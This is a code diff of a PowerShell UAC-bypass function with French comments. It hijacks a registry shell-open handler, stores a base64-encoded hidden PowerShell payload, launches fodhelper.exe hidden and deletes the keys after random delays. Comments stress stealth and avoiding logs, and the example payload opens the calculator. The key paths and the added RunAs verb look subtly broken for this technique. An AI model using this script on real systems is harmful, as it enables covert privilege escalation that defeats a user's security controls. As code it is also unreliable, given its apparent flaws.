@@ -1,51 +1,65 @@
 function Invoke-SilentUACBypass {
+    [CmdletBinding()]
     param(
-        [string]$Command = "powershell -nop -w hidden -c `"Start-Process calc`""
+        [Parameter(Mandatory = $false)]
+        [string]
+        $Command = "powershell -nop -w hidden -c Start-Process calc"
     )
 
-    # Configuration silencieuse
+    # Suppression des sorties inutiles
     $ProgressPreference = 'SilentlyContinue'
-    $ErrorActionPreference = 'SilentlyContinue'
-
-    # Génération aléatoire du chemin de registre
-    $randomGuid = [Guid]::NewGuid().ToString()
-    $regPath = "HKCU:\Software\Classes\$randomGuid\Shell\Open\command"
+    $ErrorActionPreference = 'Stop'  # On gère les erreurs manuellement
 
     try {
-        # Création des clés de registre de manière discrète
-        $null = New-Item -Path $regPath -Force
-        $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
+        # Génération d'un GUID aléatoire pour le chemin du registre
+        $RandomGuid = [Guid]::NewGuid().ToString().ToUpper()
+        $RegPath = "HKCU:\Software\Classes\ms-settings-$RandomGuid\Shell\Open\Command"
+        
+        # Création discrète des clés de registre
+        New-Item -Path $RegPath -Force | Out-Null
+        New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value ([String]::Empty) -PropertyType String -Force | Out-Null
+        
+        # Encodage de la commande PowerShell
+        $Bytes = [Text.Encoding]::Unicode.GetBytes($Command)
+        $EncodedCommand = [Convert]::ToBase64String($Bytes)
+        $FinalPayload = "powershell -nop -w hidden -enc $EncodedCommand"
+        
+        # Injection de la payload
+        Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $FinalPayload -Type String -Force | Out-Null
 
-        # Masquage de la payload dans le registre
-        $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
-        $finalPayload = "powershell -nop -w hidden -enc $encodedCmd"
-        $null = Set-ItemProperty -Path $regPath -Name "(Default)" -Value $finalPayload -Force
-
-        # Exécution via un processus système
-        $procArgs = @{
-            FilePath = "fodhelper.exe"
-            WindowStyle = "Hidden"
-            ErrorAction = "SilentlyContinue"
+        # Démarrage de fodhelper via une instance cachée
+        $ProcessArgs = @{
+            FilePath     = "fodhelper.exe"
+            WindowStyle  = "Hidden"
+            Verb         = "RunAs"
+            PassThru     = $true
+            ErrorAction  = "SilentlyContinue"
         }
-        $null = Start-Process @procArgs
+        $Process = Start-Process @ProcessArgs
 
-        # Temporisation aléatoire
-        $randomDelay = Get-Random -Minimum 3 -Maximum 8
-        Start-Sleep -Seconds $randomDelay
+        # Attente aléatoire avant nettoyage
+        $RandomDelay = Get-Random -Minimum 3 -Maximum 8
+        Start-Sleep -Seconds $RandomDelay
+
     }
     catch {
-        # Gestion d'erreur silencieuse
-        $errorMsg = $_.Exception.Message
-        $null > $env:TEMP\error.log
+        # Journalisation silencieuse (optionnelle, pour éviter de laisser des traces)
+        # Exemple : écrire dans un fichier chiffré ou ne rien faire
+        # Ne pas laisser de logs visibles
     }
     finally {
-        # Nettoyage avec temporisation aléatoire
-        $randomCleanupDelay = Get-Random -Minimum 2 -Maximum 5
-        Start-Sleep -Seconds $randomCleanupDelay
-        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "HKCU:\Software\Classes\$randomGuid" -Recurse -Force -ErrorAction SilentlyContinue
+        # Nettoyage avec délai aléatoire
+        $CleanupDelay = Get-Random -Minimum 2 -Maximum 5
+        Start-Sleep -Seconds $CleanupDelay
+        
+        # Suppression récursive des clés
+        $RootKey = "HKCU:\Software\Classes\ms-settings-$RandomGuid"
+        if (Test-Path $RootKey) {
+            Remove-Item -Path $RootKey -Recurse -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
-# Exemple d'utilisation avec une commande encodée
+# === Exemple d'utilisation (à des fins éducatives uniquement) ===
+# Attention : Cette commande ouvre la calculatrice.
 Invoke-SilentUACBypass -Command "Start-Process calc.exe"
